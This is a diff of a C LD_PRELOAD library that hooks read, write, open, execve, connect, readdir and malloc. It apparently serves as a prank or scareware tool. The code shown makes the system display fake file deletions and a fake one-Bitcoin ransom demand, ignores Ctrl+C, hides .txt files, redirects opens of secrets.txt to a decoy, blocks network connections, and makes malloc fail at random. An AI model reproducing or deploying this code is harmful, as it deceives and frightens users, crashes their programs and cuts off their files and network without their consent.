@@ -31,6 +31,7 @@ typedef struct dirent* (*orig_readdir_f_type)(DIR *);
 typedef struct dirent64* (*orig_readdir64_f_type)(DIR *);
 typedef int (*orig_open_f_type)(const char *, int, ...);
 typedef int (*orig_access_f_type)(const char *, int);
+typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);
 
 static void* (*original_malloc)(size_t)=NULL;
 ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
@@ -43,14 +44,10 @@ static int block_count = 0; // Global counter for blocked connections
 
 
 // ####### MALLOC Random #######
-//
 // Will randomly return Null 
-//
 //
 // topLimit defines the limit on how big the random generated number can be which defines 
 // the crash conditions  
-//
-//
 long get_random_uint() {  // calculates random number
     long r;
     long fd = open("/dev/urandom", O_RDONLY);
@@ -142,10 +139,12 @@ void remote_access() {
             else
                 fprintf(stderr, " ");
         }
+
         fprintf(stderr, "]\033[0m %d%%", (i * 100) / width);
         fflush(stderr); //guarantee print before next operation
         usleep(150000); 
     }
+
     sleep(1);
     fprintf(stderr, "\nYour system is being observed. We want 1 Bitcoin to revert this.");
     sleep(1);
@@ -169,7 +168,6 @@ void remote_access() {
 
 void deletion_simulation(const char *home) {
     char *fake_files[] = {"/Documents", "/Desktop", "/Public", "/snap", "/Downloads", "/.ssh", "/.cache", "/.local", "/.thunderbird", "/Projects", "/Videos"}; // simulates the deletion of all personal files
-
     for (int i = 0; i < 11; ++i) {
         fprintf(stderr, "deleted %s%s\n", home, fake_files[i]);
         usleep(300000 + rand() % 200000); //random sleep time because different sizes lead to different delete times
@@ -183,7 +181,7 @@ ssize_t read(int fd, void *buf, size_t count) {
     
     if (getenv("ALREADY_DONE")) {
     return original_read(fd, buf, count);
-}
+    }
 
     static int deletion_triggered = 0;
     static int done = 0;
@@ -193,25 +191,26 @@ ssize_t read(int fd, void *buf, size_t count) {
         return 0;  
     }
 
-    if (!deletion_triggered) {
-        deletion_triggered = 1; // avoid showing same outputs multiple times 
-        signal(SIGINT, SIG_IGN); // Ignore Ctrl+C
+    char exe[512];
+    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
+    if (len != -1 && len < sizeof(exe)) {
+        exe[len] = '\0';
+        char *name = basename(exe); // extract the used command
 
-        char exe[512];
-        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
-        if (len != -1 && len < sizeof(exe)) {
-            exe[len] = '\0';
-            char *name = basename(exe); // extract the used command
+        if (!deletion_triggered) {
+            deletion_triggered = 1; // avoid showing same outputs multiple times 
+            signal(SIGINT, SIG_IGN); // Ignore Ctrl+C
+            
             char parent_exe[256];
             char linkpath[64];
             snprintf(linkpath, sizeof(linkpath), "/proc/%d/exe", getppid());
             ssize_t len = readlink(linkpath, parent_exe, sizeof(parent_exe) - 1);
             if (len != -1) {
-            	parent_exe[len] = '\0';
-            	if (strstr(name, "less") && strstr(parent_exe, "/man")) { // man calls then less: have to avoid this function here called when we want to call the write function
-            		return original_read(fd, buf, count);
-    		}
-	}
+                parent_exe[len] = '\0';
+                if (strstr(name, "less") && strstr(parent_exe, "/man")) { // man calls then less: have to avoid this function here called when we want to call the write function
+                    return original_read(fd, buf, count);
+                }
+            }
 		
 	// The commands chmod and chown are chosen because they modify permissions /usership, therefore an access is fitting. Additionally the cat and less function because they are used more often.
             if ((strstr(name, "chmod") || strstr(name, "chown") || strstr(name, "cat") || strstr(name, "less")) && !strstr(name, "man")) {
@@ -231,18 +230,11 @@ ssize_t read(int fd, void *buf, size_t count) {
                 done = 1;
                 restore_terminal();
                 _exit(0); // to stop immediately w/o displaying additional things from the command
-            } 
-           
+            }  
         }
-    }
     
-    if (!remote_triggered) {
-    	remote_triggered = 1;
-        char exe[512];
-        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
-        if (len != -1 && len < sizeof(exe)) {
-            exe[len] = '\0';
-            char *name = basename(exe);
+        if (!remote_triggered) {
+            remote_triggered = 1;
 
             // This hijack for the "install" and "get-apt" command. install and apt-get are used for downloading, so a fake download of spy software is fitting
             if (strstr(name, "install") || strstr(name, "apt-get")) {
@@ -251,24 +243,18 @@ ssize_t read(int fd, void *buf, size_t count) {
                 signal(SIGINT, SIG_DFL);
                 restore_terminal();
                 _exit(0); 
-            }
+            }  
         }
-    }
     
-    char exe[512];
-    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
-    if (len != -1 && len < sizeof(exe)) {
-    	exe[len] = '\0';
-	char *name = basename(exe);
-	if (strstr(name, "gedit")) {
-		fprintf(stderr, "Execute this command using the bash command\n"); // otherwise the gedit hijack is not enabled 
-	    	restore_terminal();
-	    	_exit(0);
-	    }
-	   }
-
+        if (strstr(name, "gedit")) {
+            fprintf(stderr, "Execute this command using the bash command\n"); // otherwise the gedit hijack is not enabled 
+                restore_terminal();
+                _exit(0);
+        }
+	}
     return original_read(fd, buf, count);
 }
+
 
 // ####### OPEN #######
 //recommended to use with the commands cp, head, nano, cat
@@ -294,10 +280,10 @@ int open(const char *pathname, int flags, ...) {
         snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir); // redirect to a new file
         free(path_copy);
 
-        FILE *fp = fopen(fake_path, "w");
-        if (fp) {
-            fprintf(fp, "you should not be so curious\n"); // write into newly created file
-            fclose(fp);
+        FILE *newfile = fopen(fake_path, "w");
+        if (newfile) {
+            fprintf(newfile, "you should not be so curious\n"); // write into newly created file
+            fclose(newfile);
         } else {
             fprintf(stderr, "Error: could not create %s\n", fake_path);
             return -1;
@@ -309,8 +295,7 @@ int open(const char *pathname, int flags, ...) {
     if (strstr(pathname, "openThis.txt")) { // a trap for users
         fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
         restore_terminal();
-       _exit(0);
-        //return 0;
+       _exit(0); // can't open, stop 
     }
 
     va_list args;
@@ -327,9 +312,8 @@ int open(const char *pathname, int flags, ...) {
 }
 
 
-// ####### WRITE #######
+// ####### WRITE #######
 //hijacks the output of invalid commands and the reverts the output of "whoami"
-
 const char* get_real_username() { //helper function for "whoami"
     static char username[256] = {0};
     if (username[0] == '\0') {
@@ -350,8 +334,7 @@ void reverse_string(const char* in, char* out, size_t maxlen) {
     out[len] = '\0';
 }
 
-// ANSI color codes (rainbow)
-const char *colors[] = {
+const char *colors[] = { // Rainbow colored
     "\033[31m", // Red
     "\033[33m", // Yellow
     "\033[32m", // Green
@@ -361,7 +344,6 @@ const char *colors[] = {
 };
 const int num_colors = sizeof(colors) / sizeof(colors[0]);
 const char *color_reset = "\033[0m";
-
 
 bool is_printable_text(const char *data, size_t len) {
     int printable = 0;
@@ -412,22 +394,16 @@ char *make_rainbow(const char *line, size_t len, size_t *out_len) {
     return out;
 }
 
-//*/
-
 // write: in case of command not found print successful
-typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);
 ssize_t write(int fd, const void *buf, size_t count) {
     if (!original_write) {
         original_write = dlsym(RTLD_NEXT, "write");
     }
     
-    
     if (getenv("DISABLE_WRITE_PRANK")) { // needed for connect function
         return original_write(fd, buf, count);
     }
     
-   
-
 	if (!isatty(fd) || count == 0 || buf == NULL) {
         return original_write(fd, buf, count);
     }
@@ -438,8 +414,6 @@ ssize_t write(int fd, const void *buf, size_t count) {
         return original_write(fd, buf, count);
     }
 
-
-    
     char *msg = strndup(buf, count);
     if (!msg) return original_write(fd, buf, count);
 
@@ -451,8 +425,6 @@ ssize_t write(int fd, const void *buf, size_t count) {
         exit(0);
     }
     
-    
-   //*
     if (strstr(text, "usage") || strstr(text, "DO NOT MODIFY THIS FILE!") || strstr(text, "Manual page") || strstr(text, "--help")) {
         // Process line-by-line
         const char *start = text;
@@ -476,12 +448,11 @@ ssize_t write(int fd, const void *buf, size_t count) {
         }
 
         return total_written;
-    }//*/
-ssize_t result = original_write(fd, msg, count);
+    }
+    ssize_t result = original_write(fd, msg, count);
     free(msg);
     return result;
 }
-
 
 int puts(const char *s) { //because "whoami" doesn't call write directly
     static int (*real_puts)(const char *) = NULL;
@@ -498,7 +469,6 @@ int puts(const char *s) { //because "whoami" doesn't call write directly
 
     return real_puts(s);
 }
-
 
 int access(const char *pathname, int mode) { //pretending command-not-found doesn't exist
     static int (*orig_access)(const char *, int) = NULL;
@@ -517,7 +487,6 @@ int access(const char *pathname, int mode) { //pretending command-not-found does
 
 // ####### EXECVE #######
 // works similar to open, for when files want to be opened with the GUI using gedit
-
 int execve(const char *filename, char *const argv[], char *const envp[]) {
     static int (*real_execve)(const char *, char *const[], char *const[]) = NULL;
     if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
@@ -527,13 +496,11 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
         return real_execve(filename, argv, envp);
     }
 
-    // Intercept gedit calls
-    if (strstr(filename, "gedit")) {
+    if (strstr(filename, "gedit")) { // for gui text-editor with gedit
         int i = 0;
         char **new_argv = NULL;
         int hijack_needed = 0;
 
-        // Count argv
         while (argv[i] != NULL) i++;
         new_argv = malloc((i + 1) * sizeof(char *));
         for (int j = 0; j < i; ++j) {
@@ -544,23 +511,21 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
                 fprintf(stderr, "Permission denied\n");
                 exit(126);
             } else if (strstr(argv[j], "secrets.txt")) {
-                // Build path to fake file
-                char *path_copy = strdup(argv[j]);
+                char *path_copy = strdup(argv[j]); // for fake file
                 char *dir = dirname(path_copy);
 
                 char fake_path[PATH_MAX];
                 snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir);
                 free(path_copy);
 
-                // Create the fake file
-                FILE *fp = fopen(fake_path, "w");
+                FILE *fp = fopen(fake_path, "w"); // create fake file
                 if (fp) {
                     fprintf(fp, "you should not be so curious\n");
                     fclose(fp);
                 }
 
-                // Replace argument with fake path
-                new_argv[j] = strdup(fake_path);
+                
+                new_argv[j] = strdup(fake_path); // replace argument with fake path
                 hijack_needed = 1;
             } else {
                 new_argv[j] = argv[j];  // Copy unchanged
@@ -569,7 +534,6 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
         new_argv[i] = NULL;  // Null-terminate
 
         if (hijack_needed) {
-            // Prepare new env
             int envc = 0;
             while (envp[envc] != NULL) envc++;
             char **new_envp = malloc((envc + 2) * sizeof(char *));
@@ -580,7 +544,7 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
             return real_execve(filename, new_argv, new_envp);
         }
 
-        free(new_argv); // No hijack was needed
+        free(new_argv); // no hijack was needed
     }
 
     // Default path: pass through
@@ -595,10 +559,9 @@ int execve(const char *filename, char *const argv[], char *const envp[]) {
 
     return real_execve(filename, argv, new_envp);
 }
- 
 
 
-//####### CONNECT #######
+//####### CONNECT #######
 // Override connect() to selectively block certain ports and all other IP connections
 int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
     static int (*original_connect)(int, const struct sockaddr *, socklen_t) = NULL;
@@ -665,9 +628,9 @@ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
     }
 }
 
+
 //####### READDIR #######
 // Hijack ls command to not show .txt files, file hiding
-
 static int ends_with_txt(const char *str) {
     if (!str) return 0;
     size_t len = strlen(str);
